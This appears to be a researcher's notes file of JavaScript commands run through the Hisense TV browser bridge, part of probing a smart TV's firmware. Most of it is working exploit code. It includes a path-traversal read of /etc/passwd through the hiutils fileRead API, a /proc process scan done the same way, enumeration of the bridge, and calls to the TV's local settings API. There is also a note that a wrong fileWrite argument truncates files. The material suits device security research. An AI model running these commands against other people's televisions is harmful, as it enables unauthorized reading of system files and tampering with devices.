# Example bridge commands (hotfolder: cnd/NNN.js)

Each file dropped into `cnd/` becomes a command executed inside the TV browser
context (origin vidaahub.com — the only origin with the Hisense bridge).
Results land in `results.jsonl`. All examples are read-only or reversible.

## 001 — enumerate the bridge
```js
const out = {fns:{}};
Object.getOwnPropertyNames(window).filter(n=>/^Hisense_|^HiUtils_|^File|^hi[A-Z]/.test(n))
  .forEach(n=>out.fns[n]=typeof window[n]);
return out;
```

## 002 — full filesystem read via path traversal
```js
const r = vowOS.service.syncExecute('hiutils',
  {api:'fileRead', args:{path:'websdk/../../etc/passwd', mode:6}});
return (r && r.ret) ? r.msg.slice(0, 500) : r;
```

## 003 — merged app list (preset + installed)
```js
return await new Promise(res => Hisense_getInstalledApps((e, r) => res(r)));
```

## 004 — read the installed-apps database
```js
return vowOS.service.syncExecute('hiutils',
  {api:'fileRead', args:{path:'websdk/Appinfo.json', mode:6}}).msg;
```

## 005 — native TV API: current brightness / contrast / MEMC
```js
const post = async o => (await (await fetch('http://localhost:9009/service/basic/tvinfo',
  {method:'POST', body: JSON.stringify(o)})).json());
return { b: await post({api:'brightness'}), c: await post({api:'contrast'}), m: await post({api:'memcStatus'}) };
```

## 006 — set brightness 100% (reversible; default was 53)
```js
const r = await fetch('http://localhost:9009/service/basic/tvinfo',
  {method:'POST', body: JSON.stringify({api:'setbiz', args:{key:'brightness', value:100}})});
return await r.json();
```

## 007 — probe for a directory listing primitive (there is none, but errors leak info)
```js
const out = {};
for (const api of ['fileList','listDir','readDir']) {
  out[api] = vowOS.service.syncExecute('hiutils', {api, args:{path:'websdk', mode:6}});
}
return out;
```

## 008 — process list via /proc cmdline scan
```js
const out = [];
for (let p = 100; p <= 900; p++) {
  const r = vowOS.service.syncExecute('hiutils',
    {api:'fileRead', args:{path:'websdk/../../proc/'+p+'/cmdline', mode:6}});
  const s = (r && r.ret && typeof r.msg === 'string') ? r.msg : '';
  if (s) out.push(p + ': ' + s.slice(0, 100));
}
return out;
```

## Pitfalls learned the hard way
- `fileWrite` arg is `writedata`, not `data` — a wrong arg truncates the target file (it opens with `w` before validating).
- Never read `/proc/<pid>/fd/*` — some fds are pipes and the read **hangs the renderer** (crashed the whole bridge twice).
- Callback-style bridge functions (`Hisense_getInstalledApps`) need a `Promise` wrapper; a never-firing callback kills the poll loop until the page is relaunched.
- Wrap every callback await in a timeout race to keep the poll loop alive.
